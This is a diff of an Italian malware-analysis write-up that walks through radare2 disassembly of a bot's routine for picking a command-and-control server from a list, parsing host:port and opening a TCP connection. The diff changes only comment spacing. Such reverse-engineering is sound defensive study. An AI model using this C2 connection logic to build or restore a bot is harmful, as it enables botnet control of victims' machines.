@@ -97,10 +97,10 @@ visite: <span id="visits">...</span>
 
 @@@
 0x00403a95      lea rax, [dest]
-0x00403a9c      mov rdi, rax                ; void *s
-0x00403a9f      mov edx, 0x200              ; 512 ; size_t n
-0x00403aa4      mov esi, 0                  ; int c
-0x00403aa9      call sym.__GI_memset        ; void *memset(void *s, int c, size_t n)
+0x00403a9c      mov rdi, rax                ;void *s
+0x00403a9f      mov edx, 0x200              ;512 ; size_t n
+0x00403aa4      mov esi, 0                  ;int c
+0x00403aa9      call sym.__GI_memset        ;void *memset(void *s, int c, size_t n)
 @@@
 
 ;memset(dest,NULL,512)
@@ -109,7 +109,7 @@ visite: <span id="visits">...</span>
 ;il buffer è leggermente più grande dell'area inizializzata, suggerendo allineamento o layout dello stack piuttosto che una scelta intenzionale.
 
 @@@
-0x00403aae      mov eax, dword [obj.mainCommSock] ; [0x50e120:4]=0
+0x00403aae      mov eax, dword [obj.mainCommSock] ;[0x50e120:4]=0
 0x00403ab4      test eax, eax
 0x00403ab6      je 0x403acd
 @@@
@@ -120,15 +120,15 @@ visite: <span id="visits">...</span>
 ;se è zero salta, altrimenti lo chiude e lo inizializza a 0:
 
 @@@
-0x00403ab8      mov edi, dword [obj.mainCommSock] ; [0x50e120:4]=0 ; int fildes
-0x00403abe      call sym.__GI_close         ; int close(int fildes)
-0x00403ac3      mov dword [obj.mainCommSock], 0 ; [0x50e120:4]=0
+0x00403ab8      mov edi, dword [obj.mainCommSock] ;[0x50e120:4]=0 ; int fildes
+0x00403abe      call sym.__GI_close         ;int close(int fildes)
+0x00403ac3      mov dword [obj.mainCommSock], 0 ;[0x50e120:4]=0
 @@@
 
 ;lo chiude e lo inizializza a 0.
 
 @@@
-0x00403acd      mov eax, dword [obj.currentServer] ; [0x50dc38:4]=-1
+0x00403acd      mov eax, dword [obj.currentServer] ;[0x50dc38:4]=-1
 0x00403ad3      test eax, eax
 0x00403ad5      jne 0x403ae3
 @@@
@@ -146,29 +146,29 @@ visite: <span id="visits">...</span>
 ;la logica di aggiornamento di currentServer appare anomala e potenzialmente incompleta, suggerendo che il controllo dei limiti possa essere gestito altrove o che il codice sia soggetto a errori di indexing.
 
 @@@
-0x00403ae3      mov eax, dword [obj.currentServer] ; [0x50dc38:4]=-1
+0x00403ae3      mov eax, dword [obj.currentServer] ;[0x50dc38:4]=-1
 0x00403ae9      inc eax
-0x00403af1      mov eax, dword [obj.currentServer] ; [0x50dc38:4]=-1
+0x00403af1      mov eax, dword [obj.currentServer] ;[0x50dc38:4]=-1
 0x00403af7      cdqe
-0x00403af9      mov rax, qword [rax*8 + obj.commServer] ; [0x50dbe0:8]=0x40b760 sym..rodata ; "`\xb7@"
+0x00403af9      mov rax, qword [rax*8 + obj.commServer] ;[0x50dbe0:8]=0x40b760 sym..rodata ; "`\xb7@"
 @@@
 
 ;potrebbe puntare a una lista di indirizzi che contengono server, magari una lista di C2.
 ;suggerisce una lista di server C2 verso cui provare a connettersi; il failover però viene implementato attraverso le chiamate successive ad initConnection, non all'interno della funzione:
 
 @@@
-0x00403b01      mov rsi, rax                ; const char *src
-0x00403b04      lea rdi, [dest]             ; char *dest
-0x00403b0b      call sym.strcpy             ; char *strcpy(char *dest, const char *src)
+0x00403b01      mov rsi, rax                ;const char *src
+0x00403b04      lea rdi, [dest]             ;char *dest
+0x00403b0b      call sym.strcpy             ;char *strcpy(char *dest, const char *src)
 @@@
 
 ;copia in dest l'iesimo server. Questa strcpy è pericolosa; lo spazio sullo stack è molto grande, ma non c'è alcun controllo sulla lunghezza della stringa sorgente. L'assenza di controlli su strcpy introduce un potenziale stack overflow, suggerendo che la robustezza non è una priorità del codice.
 
 @@@
-0x00403b10      mov dword [var_4h], 0x1b46  ; 'F'
-0x00403b17      lea rdi, [dest]             ; const char *s
-0x00403b1e      mov esi, 0x3a               ; ':' ; 58 ; int c
-0x00403b23      call sym.__GI_strchr        ; char *strchr(const char *s, int c)
+0x00403b10      mov dword [var_4h], 0x1b46  ;'F'
+0x00403b17      lea rdi, [dest]             ;const char *s
+0x00403b1e      mov esi, 0x3a               ;':' ; 58 ; int c
+0x00403b23      call sym.__GI_strchr        ;char *strchr(const char *s, int c)
 @@@
 
 ;cerca nella stringa copiata in dest il carattere ":".
@@ -176,16 +176,16 @@ visite: <span id="visits">...</span>
 @@@
 0x00403b28      test rax, rax
 0x00403b2b      je 0x403b5e
-0x00403b2d      lea rdi, [dest]             ; const char *s
-0x00403b34      mov esi, 0x3a               ; ':' ; 58 ; int c
-0x00403b39      call sym.__GI_strchr        ; char *strchr(const char *s, int c)
+0x00403b2d      lea rdi, [dest]             ;const char *s
+0x00403b34      mov esi, 0x3a               ;':' ; 58 ; int c
+0x00403b39      call sym.__GI_strchr        ;char *strchr(const char *s, int c)
 @@@
 
 ;cerca nella stringa il carattere ":".
 
 @@@
-0x00403b3e      lea rdi, [rax + 1]          ; const char *str
-0x00403b42      call sym.atoi               ; int atoi(const char *str)
+0x00403b3e      lea rdi, [rax + 1]          ;const char *str
+0x00403b42      call sym.atoi               ;int atoi(const char *str)
 @@@
 
 ;dopo i : c'è qualche stringa che può essere convertita in numero.
@@ -197,9 +197,9 @@ visite: <span id="visits">...</span>
 ;in var_4h, dopo la funzione atoi, abbiamo il valore numerico della porta.
 
 @@@
-0x00403b4a      lea rdi, [dest]             ; const char *s
-0x00403b51      mov esi, 0x3a               ; ':' ; 58 ; int c
-0x00403b56      call sym.__GI_strchr        ; char *strchr(const char *s, int c)
+0x00403b4a      lea rdi, [dest]             ;const char *s
+0x00403b51      mov esi, 0x3a               ;':' ; 58 ; int c
+0x00403b56      call sym.__GI_strchr        ;char *strchr(const char *s, int c)
 0x00403b5b      mov byte [rax], 0
 @@@
 
@@ -216,10 +216,10 @@ visite: <span id="visits">...</span>
 ;l'assenza di riutilizzo del puntatore restituito da strchr introduce ridondanza, suggerendo un'implementazione poco ottimizzata o generata senza attenzione alle performance.
 
 @@@
-0x00403b5e      mov edx, 0                  ; int protocol
-0x00403b63      mov esi, 1                  ; int type
-0x00403b68      mov edi, 2                  ; int domain
-0x00403b6d      call sym.socket             ; int socket(int domain, int type, int protocol)
+0x00403b5e      mov edx, 0                  ;int protocol
+0x00403b63      mov esi, 1                  ;int type
+0x00403b68      mov edi, 2                  ;int domain
+0x00403b6d      call sym.socket             ;int socket(int domain, int type, int protocol)
 @@@
 
 ;viene creato un socket TCP/IPv4 (AF_INET + SOCK_STREAM).
@@ -228,11 +228,11 @@ visite: <span id="visits">...</span>
 ;1, SOCK_STREAM
 
 @@@
-0x00403b72      mov dword [obj.mainCommSock], eax ; [0x50e120:4]=0
-0x00403b78      lea rsi, [dest]             ; int64_t arg2
-0x00403b7f      mov edi, dword [obj.mainCommSock] ; [0x50e120:4]=0 ; fd_set *arg1
-0x00403b85      mov edx, dword [var_4h]     ; int64_t arg3
-0x00403b88      mov ecx, 0x1e               ; 30 ; int64_t arg4
+0x00403b72      mov dword [obj.mainCommSock], eax ;[0x50e120:4]=0
+0x00403b78      lea rsi, [dest]             ;int64_t arg2
+0x00403b7f      mov edi, dword [obj.mainCommSock] ;[0x50e120:4]=0 ; fd_set *arg1
+0x00403b85      mov edx, dword [var_4h]     ;int64_t arg3
+0x00403b88      mov ecx, 0x1e               ;30 ;int64_t arg4
 0x00403b8d      call sym.connectTimeout
 @@@
 
